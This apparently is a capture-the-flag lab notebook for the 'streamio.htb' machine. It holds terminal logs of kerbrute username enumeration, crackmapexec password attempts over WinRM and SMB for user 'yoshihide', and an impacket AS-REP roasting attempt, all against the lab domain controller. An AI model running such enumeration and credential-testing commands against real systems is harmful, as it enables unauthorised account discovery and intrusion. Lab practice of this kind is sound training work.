
## Todos

- [x] Check if potential usernames from `https://streamio.htb`
- [ ] Check potential usernames from `streamio.users`

## Check Potential Usernames

```bash
$ kerbrute userenum -d streamio.htb --dc streamio.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/19/22 - Ronnie Flathers @ropnop

2022/11/19 17:28:36 >  Using KDC(s):
2022/11/19 17:28:36 >   streamio.htb:88

2022/11/19 17:28:36 >  Done! Tested 3 usernames (0 valid) in 0.024 seconds
```

```bash
$ kerbrute userenum -d streamio.htb --dc streamio.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/19/22 - Ronnie Flathers @ropnop

2022/11/19 19:16:20 >  Using KDC(s):
2022/11/19 19:16:20 >   streamio.htb:88

2022/11/19 19:16:20 >  [+] VALID USERNAME:       yoshihide@streamio.htb
2022/11/19 19:16:20 >  Done! Tested 31 usernames (1 valid) in 0.087 seconds
```

```bash
$ crackmapexec winrm streamio.htb -d streamio.htb -u yoshihide -p '66boysandgirls..'                                                                130 ⨯
WINRM       10.129.251.212  5985   streamio.htb     [*] http://10.129.251.212:5985/wsman
WINRM       10.129.251.212  5985   streamio.htb     [-] streamio.htb\yoshihide:66boysandgirls..
$ crackmapexec smb streamio.htb -d streamio.htb -u yoshihide -p '66boysandgirls..'
SMB         10.129.251.212  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamio.htb) (signing:True) (SMBv1:False)
SMB         10.129.251.212  445    DC               [-] streamio.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
```

```bash
$ impacket-GetNPUsers -dc-ip streamio.htb streamio.htb/yoshihide -format hashcat -no-pass                                                           130 ⨯
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for yoshihide
[-] User yoshihide doesn't have UF_DONT_REQUIRE_PREAUTH set
```